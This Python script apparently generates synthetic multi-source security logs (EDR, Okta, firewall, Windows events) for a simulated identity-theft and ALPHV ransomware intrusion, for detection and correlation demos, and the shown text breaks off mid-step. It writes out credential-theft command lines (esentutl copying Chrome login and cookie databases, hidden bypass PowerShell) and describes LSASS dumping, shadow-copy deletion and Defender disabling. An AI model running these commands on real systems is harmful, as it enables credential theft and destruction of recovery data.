#!/usr/bin/env python3
"""
Cross-Platform Identity Theft & Ransomware Scenario
===============================================

Advanced, multi-phase attack simulating a modern identity-led intrusion
TTPs aligned to real-world intrusion reporting:

  - Credential theft via esentutl.exe LOLBin (Chrome DB copy) + PyInstaller stealer
  - Stolen OAuth refresh-token abuse through Okta (non-interactive sign-in)
  - C2 via legitimate remote-access tools: ScreenConnect, ngrok tunnels, AnyDesk
  - AD reconnaissance with SharpHound (BloodHound), ADRecon, csvde, native LOLBins
  - LSASS dump via comsvcs.dll MiniDump + Okta privilege escalation
  - ALPHV/BlackCat ransomware deployment with per-victim access-token config
  - VSS deletion, Defender disablement, and boot recovery inhibition

Cross-product correlation across EDR, identity (Okta), network (Palo Alto),
and Windows Security logs in a single data lake.

Sources:
- SentinelOne EDR/XDR  (endpoint)
- Okta Authentication  (identity / IdP)
- Palo Alto Firewall   (network)
- Windows Event Logs   (endpoint / Windows Security)

Phases & Steps:
  Phase 1 – Initial Access / Credential Theft (steps 1-5)
  Phase 2 – Command & Control               (steps 6-7)
  Phase 3 – Endpoint Discovery & Staging     (step 8)
  Phase 4 – Credential & Privilege Abuse     (step 9)
  Phase 5 – Ransomware Preparation           (step 10)
  Phase 6 – Ransomware Execution / Impact    (steps 11-12)

MITRE ATT&CK:
  T1539  – Steal Web Session Cookie
  T1550  – Use Alternate Authentication Material
  T1078  – Valid Accounts
  T1219  – Remote Access Software (ScreenConnect, AnyDesk, ngrok)
  T1218  – System Binary Proxy Execution (esentutl.exe)
  T1059  – Command and Scripting Interpreter
  T1003  – OS Credential Dumping (LSASS)
  T1087  – Account Discovery (SharpHound, ADRecon)
  T1486  – Data Encrypted for Impact (ALPHV/BlackCat)
  T1490  – Inhibit System Recovery
  T1562  – Impair Defenses (Set-MpPreference)
"""

import json
import os
import sys
import errno
import random
import uuid
import hashlib
import copy
import gzip
try:
    import requests
except ModuleNotFoundError:
    requests = None
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional

# ---------------------------------------------------------------------------
# Path setup — same pattern as other scenarios
# ---------------------------------------------------------------------------
script_dir = os.path.dirname(os.path.abspath(__file__))
backend_dir = os.path.dirname(script_dir)
sys.path.insert(0, backend_dir)
sys.path.insert(0, os.path.join(backend_dir, 'event_generators'))
sys.path.insert(0, os.path.join(backend_dir, 'event_generators', 'endpoint_security'))
sys.path.insert(0, os.path.join(backend_dir, 'event_generators', 'identity_access'))
sys.path.insert(0, os.path.join(backend_dir, 'event_generators', 'network_security'))
sys.path.insert(0, os.path.join(backend_dir, 'event_generators', 'shared'))

# Import event generators
from sentinelone_endpoint import sentinelone_endpoint_log
from okta_authentication import okta_authentication_log
from paloalto_firewall import paloalto_firewall_log, generate_traffic_log, generate_threat_log
from microsoft_windows_eventlog import microsoft_windows_eventlog_log

# ---------------------------------------------------------------------------
# Profiles
# ---------------------------------------------------------------------------
VICTIM_PROFILE = {
    "name": "Chris Nakamura",
    "email": "chris@roarinpenguin.com",
    "username": "chris.nakamura",
    "department": "Engineering",
    "role": "Senior Software Engineer",
    "domain": "ROARINPENGUIN",
    "hostname": "HOST-EXT01",
    "hostname_secondary": "HOST-01",
    "normal_ip": "10.20.5.42",
    "external_ip": "203.0.113.55",
    "okta_user_id": str(uuid.uuid4()),
    "work_hours_start": 8,
    "work_hours_end": 18,
}

ATTACKER_PROFILE = {
    "name": "Identity Theft Operator",
    "attacker_ip": "91.215.85.22",                     # Unusual IP / attacker VPS
    "attacker_asn": "AS44477",                          # Bulletproof hosting ASN
    "attacker_isp": "Stark Industries Solutions",
    "attacker_country": "Moldova",
    "attacker_city": "Chisinau",
    # C2: attacker abuses legitimate remote-access tools
    "c2_domain_primary": "relay.screenconnect.com",     # ConnectWise ScreenConnect relay
    "c2_domain_secondary": "0.tcp.ngrok.io",            # ngrok tunnel
    "c2_ip_primary": "185.220.101.45",
    "c2_ip_secondary": "45.153.241.89",
    "c2_port": 443,
    "c2_port_secondary": 13372,                          # ngrok random high port
    "screenconnect_binary": "ScreenConnect.ClientService.exe",
    "anydesk_binary": "AnyDesk.exe",
    "stolen_token_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Credential theft: attacker uses esentutl + Python stealers
    "credential_tool": "esentutl.exe",                  # Native Windows LOLBin for DB copy
    "credential_stealer": "chromium_dump.py",            # Custom Python stealer
    "credential_stealer_compiled": "svc_diag.exe",       # PyInstaller-compiled stealer
    "credential_tool_sha256": hashlib.sha256(b"identity-theft-svc-diag-stealer").hexdigest(),
    # Ransomware: ALPHV/BlackCat (Rust-based)
    "ransomware_binary": "svchost_update.exe",           # Masquerading as svchost
    "ransomware_config": "desktop.dat",                  # Encrypted ALPHV config
    "ransomware_family": "ALPHV/BlackCat",
    "ransomware_sha256": hashlib.sha256(b"alphv-blackcat-identity-theft").hexdigest(),
    "ransomware_sha1": hashlib.sha1(b"alphv-blackcat-identity-theft").hexdigest(),
    "ransomware_md5": hashlib.md5(b"alphv-blackcat-identity-theft").hexdigest(),
    "ransomware_extension": ".kh1ftzx",                 # ALPHV random 7-char extension
    "ransom_note": "RECOVER-kh1ftzx-FILES.txt",          # ALPHV-style note
    "new_device_name": "YOURORG-IT-PC03",               # Social engineering: looks like IT dept
}

# Correlation config (same pattern as Apollo scenario)
CORRELATION_CONFIG = {
    "scenario_id": "identity-theft-ransomware",
    "name": "Cross-Platform Identity Theft & Ransomware",
    "description": (
        "Advanced identity-led attack: esentutl.exe LOLBin credential theft, "
        "stolen OAuth refresh-token abuse through Okta, C2 via ScreenConnect/ngrok/AnyDesk, "
        "AD reconnaissance (SharpHound, ADRecon), LSASS dump + Okta privilege escalation, "
        "and ALPHV/BlackCat ransomware execution with VSS deletion."
    ),
    "default_query": (
        "dataSource.name in ('SentinelOne','Windows Event Logs','Okta Authentication','Palo Alto Firewall') "
        "endpoint.name contains ('HOST-EXT01','HOST-01') OR src.user.name contains 'chris'\n\n"
        "| group newest_timestamp = newest(timestamp), oldest_timestamp = oldest(timestamp) "
        "by event.type, src.process.user, endpoint.name\n"
        "| sort newest_timestamp\n"
        "| columns event.type, src.process.user, endpoint.name, oldest_timestamp, newest_timestamp"
    ),
    "time_anchors": [
        {
            "id": "credential_theft_start",
            "name": "Credential Theft Start",
            "description": "First EDR activity showing credential dumping on HOST-EXT01",
            "query_match": {"endpoint.name": "HOST-EXT01"},
            "use_field": "oldest_timestamp",
            "required": True,
        },
        {
            "id": "ransomware_detection",
            "name": "Ransomware Detection",
            "description": "Ransomware alert on HOST-01",
            "query_match": {"endpoint.name": "HOST-01"},
            "use_field": "newest_timestamp",
            "required": False,
        },
    ],
    "phase_mapping": {
        "credential_theft": {
            "anchor": "credential_theft_start",
            "offset_minutes": 0,
            "description": "Credential dumping begins on HOST-EXT01",
        },
        "identity_abuse": {
            "anchor": "credential_theft_start",
            "offset_minutes": 5,
            "description": "Stolen token redeemed ~5 min after dump",
        },
        "command_and_control": {
            "anchor": "credential_theft_start",
            "offset_minutes": 12,
            "description": "C2 connections from compromised host",
        },
        "discovery_staging": {
            "anchor": "credential_theft_start",
            "offset_minutes": 20,
            "description": "Endpoint discovery and staging",
        },
        "privilege_abuse": {
            "anchor": "credential_theft_start",
            "offset_minutes": 30,
            "description": "Credential theft and privilege escalation",
        },
        "ransomware_prep": {
            "anchor": "credential_theft_start",
            "offset_minutes": 40,
            "description": "Ransomware staging on HOST-01",
        },
        "ransomware_execution": {
            "anchor": "credential_theft_start",
            "offset_minutes": 50,
            "description": "Ransomware detonation and VSS deletion",
        },
    },
    "fallback_behavior": "offset_from_now",
}

# Alert configuration for scenario phases
ALERT_PHASE_MAPPING = {
    "🔑 PHASE 1 – Initial Access / Credential Theft": {
        "template": "default_alert",
        "offset_minutes": 6,
        "target": "host_initial",
        "overrides": {
            "finding_info.title": "Browser credential database copied via esentutl.exe (LOLBin)",
            "finding_info.desc": (
                f"Credential-theft activity detected for {VICTIM_PROFILE['email']} on {VICTIM_PROFILE['hostname']}. "
                f"Native Windows utility esentutl.exe was used to copy Chrome Login Data and Cookies databases, "
                f"followed by execution of a PyInstaller-compiled stealer ({ATTACKER_PROFILE['credential_stealer_compiled']}). "
                f"This maps to T1539 (Steal Web Session Cookie) and T1550.001 (Application Access Token) – "
                f"a high-fidelity credential harvesting chain."
            ),
            "severity_id": 4,
            "severity": "high",
        },
    },
    "📡 PHASE 2 – Command & Control": {
        "template": "default_alert",
        "offset_minutes": 14,
        "target": "host_initial",
        "overrides": {
            "finding_info.title": "Unauthorized remote access tools installed (ScreenConnect, ngrok, AnyDesk)",
            "finding_info.desc": (
                f"Multiple unauthorized remote management tools were installed on {VICTIM_PROFILE['hostname']}: "
                f"ConnectWise ScreenConnect (silent MSI install), ngrok reverse TCP tunnel to "
                f"{ATTACKER_PROFILE['c2_ip_secondary']}:{ATTACKER_PROFILE['c2_port_secondary']}, and AnyDesk with "
                f"auto-start persistence. The intrusion consistently abuses legitimate remote access software "
                f"for hands-on-keyboard C2 to evade network-based detections."
            ),
            "severity_id": 5,
            "severity": "critical",
        },
    },
    "🔍 PHASE 3 – Endpoint Discovery & Staging": {
        "template": "default_alert",
        "offset_minutes": 22,
        "target": "host_secondary",
        "overrides": {
            "finding_info.title": "Active Directory reconnaissance via SharpHound and ADRecon",
            "finding_info.desc": (
                f"Extensive AD enumeration detected on {VICTIM_PROFILE['hostname_secondary']} launched from "
                f"ScreenConnect session: SharpHound (BloodHound collector) with --CollectionMethods All, "
                f"ADRecon PowerShell module, csvde.exe user export, plus native discovery LOLBins "
                f"(net group, nltest /dclist, systeminfo). Consistent with pre-escalation "
                f"reconnaissance mapping Domain Admins and trust relationships."
            ),
            "severity_id": 4,
            "severity": "high",
        },
    },
    "⚡ PHASE 4 – Credential & Privilege Abuse": {
        "template": "default_alert",
        "offset_minutes": 32,
        "target": "host_secondary",
        "overrides": {
            "finding_info.title": "LSASS credential dump and Okta SUPER_ADMIN role assignment",
            "finding_info.desc": (
                f"Privilege escalation chain detected: comsvcs.dll MiniDump used to dump LSASS memory on "
                f"{VICTIM_PROFILE['hostname_secondary']}, Windows 4672 special-privilege logon observed, "
                f"followed by Okta SUPER_ADMIN role granted to {VICTIM_PROFILE['email']} from attacker IP "
                f"{ATTACKER_PROFILE['attacker_ip']} ({ATTACKER_PROFILE['attacker_country']}). This cross-platform "
                f"escalation from endpoint to identity provider is a core identity-led intrusion pattern."
            ),
            "severity_id": 5,
            "severity": "critical",
        },
    },
    "💣 PHASE 5 – Ransomware Preparation": {
        "template": "default_alert",
        "offset_minutes": 41,
        "target": "host_secondary",
        "overrides": {
            "finding_info.title": f"{ATTACKER_PROFILE['ransomware_family']} ransomware payload staged with defense evasion",
            "finding_info.desc": (
                f"ALPHV/BlackCat ransomware staging detected on {VICTIM_PROFILE['hostname_secondary']}: "
                f"Rust-based encryptor dropped as {ATTACKER_PROFILE['ransomware_binary']} alongside encrypted config "
                f"({ATTACKER_PROFILE['ransomware_config']}), Windows Defender real-time protection disabled via "
                f"Set-MpPreference, and boot recovery disabled via bcdedit. This reflects a modern "
                f"identity compromise progressing to ransomware deployment."
            ),
            "severity_id": 5,
            "severity": "critical",
        },
    },
    "🔥 PHASE 6 – Ransomware Execution / Impact": {
        "template": "default_alert",
        "offset_minutes": 52,
        "target": "host_secondary",
        "overrides": {
            "finding_info.title": f"{ATTACKER_PROFILE['ransomware_family']} ransomware executed – VSS deleted, files encrypted",
            "finding_info.desc": (
                f"High-confidence ALPHV/BlackCat ransomware execution on {VICTIM_PROFILE['hostname_secondary']}: "
                f"files encrypted with {ATTACKER_PROFILE['ransomware_extension']} extension, ransom notes "
                f"({ATTACKER_PROFILE['ransom_note']}) dropped per directory, Volume Shadow Copies deleted via "
                f"vssadmin and wmic, VSS service disabled via sc.exe, and boot policy set to ignoreallfailures. "
                f"Maps to T1486 (Data Encrypted for Impact) and T1490 (Inhibit System Recovery)."
            ),
            "severity_id": 5,
            "severity": "critical",
        },
    },
}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def get_scenario_time(base_time: datetime, minutes_offset: int, seconds_offset: int = 0) -> str:
    event_time = base_time + timedelta(minutes=minutes_offset, seconds=seconds_offset)
    return event_time.isoformat()

def ts_ns(base_time: datetime, minutes_offset: int, seconds_offset: int = 0) -> int:
    """Return epoch nanoseconds for SentinelOne event.time field."""
    dt = base_time + timedelta(minutes=minutes_offset, seconds=seconds_offset)
    return str(int(dt.timestamp() * 1_000_000_000))

def create_event(timestamp: str, source: str, phase: str, event_data) -> Dict:
    return {"timestamp": timestamp, "source": source, "phase": phase, "event": event_data}

def load_alert_template(template_id: str) -> Optional[Dict]:
    """Load an alert template JSON from the templates directory."""
    candidate_dirs = [
        os.path.join(backend_dir, 'api', 'app', 'alerts', 'templates'),
        os.path.join(backend_dir, 'app', 'alerts', 'templates'),
    ]
    for templates_dir in candidate_dirs:
        template_path = os.path.join(templates_dir, f"{template_id}.json")
        if os.path.exists(template_path):
            with open(template_path, 'r') as f:
                return json.load(f)
    print(f"   Template not found: {template_id}.json (searched {candidate_dirs})")
    return None

def send_phase_alert(
    phase_name: str,
    base_time: datetime,
    uam_config: Dict,
    include_helios_prefix: bool = False,
) -> bool:
    """Send alert for a specific scenario phase using UAM ingest API."""
    if phase_name not in ALERT_PHASE_MAPPING:
        return False

    mapping = ALERT_PHASE_MAPPING[phase_name]
    template = load_alert_template(mapping["template"])
    if not template:
        return False

    alert = copy.deepcopy(template)
    alert_time = base_time + timedelta(minutes=mapping["offset_minutes"])
    time_ms = int(alert_time.timestamp() * 1000)

    if "finding_info" not in alert:
        alert["finding_info"] = {}
    alert["finding_info"]["uid"] = str(uuid.uuid4())

    alert["time"] = time_ms
    if "metadata" not in alert:
        alert["metadata"] = {}
    alert["metadata"]["logged_time"] = time_ms
    alert["metadata"]["modified_time"] = time_ms

    target = mapping.get("target", "host_secondary")
    if target == "host_initial":
        resource_name = VICTIM_PROFILE["hostname"]
        resource_uid = str(uuid.uuid5(uuid.NAMESPACE_DNS, resource_name))
    elif target == "user":
        resource_name = VICTIM_PROFILE["email"]
        resource_uid = str(uuid.uuid5(uuid.NAMESPACE_DNS, resource_name))
    else:
        resource_name = VICTIM_PROFILE["hostname_secondary"]
        resource_uid = str(uuid.uuid5(uuid.NAMESPACE_DNS, resource_name))
    alert["resources"] = [{"uid": resource_uid, "name": resource_name}]

    overrides = mapping.get("overrides", {})
    for key, value in overrides.items():
        if "." in key:
            keys = key.split(".")
            current = alert
            for k in keys[:-1]:
                if k not in current or not isinstance(current[k], dict):
                    current[k] = {}
                current = current[k]
            current[keys[-1]] = value
        else:
            alert[key] = value

    if include_helios_prefix:
        title = alert.get("finding_info", {}).get("title", "")
        if title and not title.startswith("HELIOS - "):
            alert["finding_info"]["title"] = f"HELIOS - {title}"

    if requests is None:
        print("   Alert send failed: missing optional dependency 'requests'")
        return False

    try:
        ingest_url = uam_config['uam_ingest_url'].rstrip('/') + '/v1/alerts'
        scope = uam_config['uam_account_id']
        if uam_config.get('uam_site_id'):
            scope = f"{scope}:{uam_config['uam_site_id']}"

        headers = {
            "Authorization": f"Bearer {uam_config['uam_service_token']}",
            "S1-Scope": scope,
            "Content-Encoding": "gzip",
            "Content-Type": "application/json",
            "S1-Trace-Id": "helios-ingest-uam:alwayslog",
        }

        payload = json.dumps(alert).encode("utf-8")
        gzipped = gzip.compress(payload)

        print("\n      Alert Details:")
        print(f"         Template: {mapping['template']}")
        print(f"         Title: {alert.get('finding_info', {}).get('title', 'N/A')}")
        print(f"         Resource: {resource_name}")
        print(f"         Time: {alert_time.isoformat()} ({time_ms}ms)")
        print(f"         URL: {ingest_url}")
        print(f"         Scope: {scope}")
        print(f"         Payload: {len(payload)} bytes -> {len(gzipped)} bytes (gzip)")

        resp = requests.post(ingest_url, headers=headers, data=gzipped, timeout=30)
        print(f"         Response: {resp.status_code} {resp.reason}")
        if resp.content:
            print(f"         Body: {resp.text[:200]}")
        return resp.status_code == 202
    except Exception as e:
        print(f"   Alert send failed: {e}")
        return False

# ---------------------------------------------------------------------------
# Phase 1 – Initial Access / Credential Theft  (Steps 1-5)
# ---------------------------------------------------------------------------

def generate_step1_credential_dumping(base_time: datetime) -> List[Dict]:
    """Step 1: SentinelOne EDR – attacker runs browser/token dumping on HOST-EXT01.

    The intrusion typically chains two LOLBin/stealer steps:
      1) esentutl.exe (native Windows) to copy Chrome's Login Data / Cookies DB
      2) A PyInstaller-compiled Python stealer (svc_diag.exe) to parse tokens
    """
    events = []

    # 1a – esentutl.exe copies Chrome Login Data (LOLBin, evades most AV)
    t = get_scenario_time(base_time, 0)
    s1 = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 0),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "endpoint.type": "workstation",
        "src.process.name": ATTACKER_PROFILE["credential_tool"],
        "src.process.cmdline": (
            f"esentutl.exe /y \"C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Google\\Chrome\\"
            f"User Data\\Default\\Login Data\" /d \"C:\\Users\\{VICTIM_PROFILE['username']}\\"
            f"AppData\\Local\\Temp\\tmpDB-chrome.dat\" /o"
        ),
        "src.process.image.path": "C:\\Windows\\System32\\esentutl.exe",
        "src.process.parent.name": "powershell.exe",
        "src.process.parent.cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -ep Bypass",
        "src.process.indicatorInfostealerCount": 1,
        "src.process.indicatorEvasionCount": 1,
        "src.process.indicatorGeneralCount": 3,
        "indicator.category": "Credentials",
        "indicator.name": "LOLBin Browser Database Copy",
        "indicator.description": "esentutl.exe used to copy Chrome Login Data during credential harvesting",
    })
    events.append(create_event(t, "sentinelone_endpoint", "credential_theft", s1))

    # 1b – esentutl.exe copies Chrome Cookies DB (for session tokens / OAuth refresh)
    t1b = get_scenario_time(base_time, 0, 8)
    s1_cookies = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 0, 8),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "src.process.name": ATTACKER_PROFILE["credential_tool"],
        "src.process.cmdline": (
            f"esentutl.exe /y \"C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Google\\Chrome\\"
            f"User Data\\Default\\Network\\Cookies\" /d \"C:\\Users\\{VICTIM_PROFILE['username']}\\"
            f"AppData\\Local\\Temp\\tmpDB-cookies.dat\" /o"
        ),
        "src.process.image.path": "C:\\Windows\\System32\\esentutl.exe",
        "src.process.parent.name": "powershell.exe",
        "src.process.indicatorInfostealerCount": 2,
    })
    events.append(create_event(t1b, "sentinelone_endpoint", "credential_theft", s1_cookies))

    # 1c – PyInstaller-compiled stealer parses copied DBs and extracts tokens
    t2 = get_scenario_time(base_time, 0, 15)
    s1_stealer = sentinelone_endpoint_log({
        "event.type": "Process Creation",
        "event.time": ts_ns(base_time, 0, 15),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "endpoint.type": "workstation",
        "src.process.name": ATTACKER_PROFILE["credential_stealer_compiled"],
        "src.process.cmdline": f"C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Temp\\{ATTACKER_PROFILE['credential_stealer_compiled']} --quiet --out C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Temp\\diag_output.enc",
        "src.process.image.path": f"C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Temp\\{ATTACKER_PROFILE['credential_stealer_compiled']}",
        "src.process.image.sha256": ATTACKER_PROFILE["credential_tool_sha256"],
        "src.process.parent.name": "powershell.exe",
        "src.process.parent.cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -ep Bypass",
        "src.process.indicatorInfostealerCount": 4,
        "src.process.indicatorEvasionCount": 2,
        "src.process.indicatorGeneralCount": 6,
        "indicator.category": "Credentials",
        "indicator.name": "Compiled Python Credential Stealer",
        "indicator.description": "PyInstaller-packed stealer parsing Chrome credential and cookie databases for OAuth refresh tokens",
    })
    events.append(create_event(t2, "sentinelone_endpoint", "credential_theft", s1_stealer))

    # 1d – File creation: encrypted exfil archive with harvested tokens
    t3 = get_scenario_time(base_time, 0, 25)
    s1_file = sentinelone_endpoint_log({
        "event.type": "File Creation",
        "event.time": ts_ns(base_time, 0, 25),
        "os.name": "Windows",
        "endpoint.name": VICTIM_PROFILE["hostname"],
        "src.process.name": ATTACKER_PROFILE["credential_stealer_compiled"],
        "tgt.file.path": f"C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Temp\\diag_output.enc",
        "tgt.file.size": 67584,
    })
    events.append(create_event(t3, "sentinelone_endpoint", "credential_theft", s1_file))

    # 1e – Windows Security 4663: object access on Chrome Login Data
    t4 = get_scenario_time(base_time, 0, 30)
    wel_raw = _build_wel_event(
        event_id=4663,
        description="An attempt was made to access an object.",
        user=VICTIM_PROFILE["username"],
        domain=VICTIM_PROFILE["domain"],
        computer=VICTIM_PROFILE["hostname"],
        object_name=f"C:\\Users\\{VICTIM_PROFILE['username']}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        process_name="C:\\Windows\\System32\\esentutl.exe",
        access_mask="0x1",
    )
    events.append(create_event(t4, "microsoft_windows_eventlog", "credential_theft", wel_raw))

    return events

def generate_step2_token_redeem(base_time: datetime) -> List[Dict]:
    """Step 2: Okta – stolen refresh token redeemed from unusual IP."""
    events = []

    t = get_scenario_time(base_time, 5)
    okta_event = {
        "uuid": str(uuid.uuid4()),
        "published": t,
        "eventType": "user.authentication.sso",
        "version": "0",
        "severity": "WARN",
        "legacyEventType": "user.authentication.sso_success",
        "displayMessage": "User single sign on to app via token refresh",
        "actor": {
            "id": VICTIM_PROFILE["okta_user_id"],
            "type": "User",
            "alternateId": VICTIM_PROFILE["email"],
            "displayName": VICTIM_PROFILE["name"],
        },
        "client": {
            "userAgent": {
                "rawUserAgent": ATTACKER_PROFILE["stolen_token_user_agent"],
                "os": {"family": "Windows"},
                "browser": {"family": "Chrome"},
            },
            "zone": "PUBLIC",
            "device": "Computer",
            "ipAddress": ATTACKER_PROFILE["attacker_ip"],
            "geographicalContext": {
                "city": ATTACKER_PROFILE["attacker_city"],
                "state": "",
                "country": ATTACKER_PROFILE["attacker_country"],
                "postalCode": "",
                "geolocation": {"lat": 47.0105, "lon": 28.8638},
            },
        },
        "outcome": {
            "result": "SUCCESS",
            "reason": "Refresh token redeemed – non-interactive sign-in",
        },
        "transaction": {"type": "WEB", "id": str(uuid.uuid4())},
        "debugContext": {
            "debugData": {
                "requestId": str(uuid.uuid4()),
                "requestUri": "/oauth2/v1/token",
                "threatSuspected": "true",
                "url": "/oauth2/v1/token",
                "dtHash": str(uuid.uuid4()),
                "loginResult": "SUCCESS",
                "refreshTokenId": str(uuid.uuid4()),
            }
        },
        "authenticationContext": {
            "authenticationStep": 0,
            "externalSessionId": str(uuid.uuid4()),
            "rootSessionId": str(uuid.uuid4()),
        },
        "securityContext": {
            "asNumber": 44477,
            "asOrg": ATTACKER_PROFILE["attacker_isp"],
            "isp": ATTACKER_PROFILE["attacker_isp"],
            "domain": "starkglobal.net",
            "isProxy": True,
        },
    }
    events.append(create_event(t, "okta_authentication", "credential_theft", json.dumps(okta_event)))

    return events

def generate_step3_oauth_grant(base_time: datetime) -> List[Dict]:
    """Step 3: Okta – new OAuth session / consent grant observed for chris."""
    events = []

    t = get_scenario_time(base_time, 7)
    okta_event = {
        "uuid": str(uuid.uuid4()),
        "published": t,
        "eventType": "app.oauth2.consent.grant",
        "version": "0",
        "severity": "WARN",
        "legacyEventType": "app.oauth2.consent.grant",
        "displayMessage": "OAuth2 consent grant for mailbox and calendar access",
        "actor": {
            "id": VICTIM_PROFILE["okta_user_id"],
            "type": "User",
            "alternateId": VICTIM_PROFILE["email"],
            "displayName": VICTIM_PROFILE["name"],
        },
        "client": {
            "userAgent": {
                "rawUserAgent": ATTACKER_PROFILE["stolen_token_user_agent"],
                "os": {"family": "Windows"},
                "browser": {"family": "Chrome"},
            },
            "zone": "PUBLIC",
            "device": "Computer",
            "ipAddress": ATTACKER_PROFILE["attacker_ip"],
            "geographicalContext": {
                "city": ATTACKER_PROFILE["attacker_city"],
                "state": "",
                "country": ATTACKER_PROFILE["attacker_country"],
                "postalCode": "",
                "geolocation": {"lat": 47.0105, "lon": 28.8638},
            },
        },
        "outcome": {"result": "SUCCESS", "reason": "OAuth2 consent granted"},
        "target": [
            {
                "id": str(uuid.uuid4()),
                "type": "AppInstance",
                "alternateId": "Microsoft Office 365",
                "displayName": "Microsoft Office 365",
            },
            {
                "id": str(uuid.uuid4()),
                "type": "access_token",
                "alternateId": "oat_access_token",
                "displayName": "OAuth Access Token",
            },
        ],
        "transaction": {"type": "WEB", "id": str(uuid.uuid4())},
        "debugContext": {
            "debugData": {
                "requestId": str(uuid.uuid4()),
                "requestUri": "/oauth2/v1/authorize",
                "threatSuspected": "true",
                "grantedScopes": "openid,profile,email,Mail.Read,Mail.ReadWrite,Calendars.Read",
            }
        },
        "authenticationContext": {
            "authenticationStep": 0,
            "externalSessionId": str(uuid.uuid4()),
            "rootSessionId": str(uuid.uuid4()),
        },
        "securityContext": {
            "asNumber": 44477,
            "asOrg": ATTACKER_PROFILE["attacker_isp"],
            "isp": ATTACKER_PROFILE["attacker_isp"],
            "domain": "starkglobal.net",
            "isProxy": True,
        },
    }
    events.append(create_event(t, "okta_authentication", "identity_abuse", json.dumps(okta_event)))

    return events

def generate_step4_impossible_travel(base_time: datetime) -> List[Dict]:
    """Step 4: Okta – impossible travel / anomalous sign-in detected."""
    events = []

    t = get_scenario_time(base_time, 8)
    okta_event = {
        "uuid": str(uuid.uuid4()),
        "published": t,
        "eventType": "policy.evaluate_sign_on",
        "version": "0",
        "severity": "WARN",
        "legacyEventType": "policy.evaluate_sign_on",
        "displayMessage": "Anomalous sign-in: impossible travel detected for chris@roarinpenguin.com",
        "actor": {
            "id": VICTIM_PROFILE["okta_user_id"],
            "type": "User",
            "alternateId": VICTIM_PROFILE["email"],
            "displayName": VICTIM_PROFILE["name"],
        },
        "client": {
            "userAgent": {
                "rawUserAgent": ATTACKER_PROFILE["stolen_token_user_agent"],
                "os": {"family": "Windows"},
                "browser": {"family": "Chrome"},
            },
            "zone": "PUBLIC",
            "device": "Computer",
            "ipAddress": ATTACKER_PROFILE["attacker_ip"],
            "geographicalContext": {
                "city": ATTACKER_PROFILE["attacker_city"],
                "state": "",
                "country": ATTACKER_PROFILE["attacker_country"],
                "postalCode": "",
                "geolocation": {"lat": 47.0105, "lon": 28.8638},
            },
        },
        "outcome": {
            "result": "ALLOW",
            "reason": "Sign-on policy evaluation: anomalous location but valid token",
        },
        "transaction": {"type": "WEB", "id": str(uuid.uuid4())},
        "debugContext": {
            "debugData": {
                "requestId": str(uuid.uuid4()),
                "requestUri": "/api/v1/authn",
                "threatSuspected": "true",
                "risk": json.dumps({
                    "level": "HIGH",
                    "reasons": [
                        "Anomalous Location",
                        "Impossible Travel",
                        "New ASN",
                        "Unfamiliar Client",
                    ],
                }),
                "behaviors": json.dumps({
                    "New Geo-Location": "POSITIVE",
                    "New Device": "POSITIVE",
                    "New IP": "POSITIVE",
                    "New State": "POSITIVE",
                    "New Country": "POSITIVE",
                    "Velocity": "POSITIVE",
                }),
            }
        },
        "authenticationContext": {
            "authenticationStep": 0,
            "externalSessionId": str(uuid.uuid4()),
            "rootSessionId": str(uuid.uuid4()),
        },
        "securityContext": {
            "asNumber": 44477,
            "asOrg": ATTACKER_PROFILE["attacker_isp"],
            "isp": ATTACKER_PROFILE["attacker_isp"],
            "domain": "starkglobal.net",
            "isProxy": True,
        },
    }
    events.append(create_event(t, "okta_authentication", "identity_abuse", json.dumps(okta_event)))

    return events

def generate_step5_persistent_session(base_time: datetime) -> List[Dict]:
    """Step 5: Okta – long-lived session / new device registration."""
    events = []

    t = get_scenario_time(base_time, 9, 30)
    okta_event = {
        "uuid": str(uuid.uuid4()),
        "published": t,
        "eventType": "device.enrollment.create",
        "version": "0",
        "severity": "WARN",
        "legacyEventType": "device.enrollment.create",
        "displayMessage": f"New device registered: {ATTACKER_PROFILE['new_device_name']} for {VICTIM_PROFILE['email']}",
        "actor": {
            "id": VICTIM_PROFILE["okta_user_id"],
            "type": "User",
            "alternateId": VICTIM_PROFILE["email"],
            "displayName": VICTIM_PROFILE["name"],
        },
        "client": {
            "userAgent": {
                "rawUserAgent": ATTACKER_PROFILE["stolen_token_user_agent"],
                "os": {"family": "Windows"},
                "browser": {"family": "Chrome"},
            },
            "zone": "PUBLIC",
            "device": "Computer",
            "ipAddress": ATTACKER_PROFILE["attacker_ip"],
            "geographicalContext": {
                "city": ATTACKER_PROFILE["attacker_city"],
                "state": "",
                "country": ATTACKER_PROFILE["attacker_country"],
                "postalCode": "",
                "geolocation": {"lat": 47.0105, "lon": 28.8638},
            },
        },
        "outcome": {"result": "SUCCESS", "reason": "Device enrollment completed"},
        "target": [
            {
                "id": str(uuid.uuid4()),
                "type": "Device",
                "alternateId": ATTACKER_PROFILE["new_device_name"],
                "displayName": ATTACKER_PROFILE["new_device_name"],
            }
        ],
        "transaction": {"type": "WEB", "id": str(uuid.uuid4())},
        "debugContext": {
            "debugData": {
                "requestId": str(uuid.uuid4()),
                "requestUri": "/api/v1/devices",
                "threatSuspected": "true",
                "devicePlatform": "WINDOWS",
                "enrollmentType": "passwordless",
            }
        },
        "authenticationContext": {
            "authenticationStep": 0,
            "externalSessionId": str(uuid.uuid4()),
            "rootSessionId": str(uuid.uuid4()),
        },
        "securityContext": {
            "asNumber": 44477,
